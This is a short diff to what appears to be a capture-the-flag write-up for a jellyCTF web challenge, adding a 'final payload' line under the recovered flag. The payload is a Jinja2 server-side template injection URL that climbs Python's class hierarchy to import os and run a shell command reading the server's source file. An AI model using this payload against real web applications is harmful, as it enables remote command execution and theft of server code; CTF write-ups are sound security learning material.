@@ -69,3 +69,4 @@ And there it is! Our flag!
 
 Final flag: `jellyCTF{f1agp1ll3d_t3mpl4te_1nj3ct10nmaxx3r}`
 
+Final payload: `https://bro-visited-his-site.jellyc.tf/response?word={% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat bros_site.py").read()}}{%endif%}{% endfor %}`
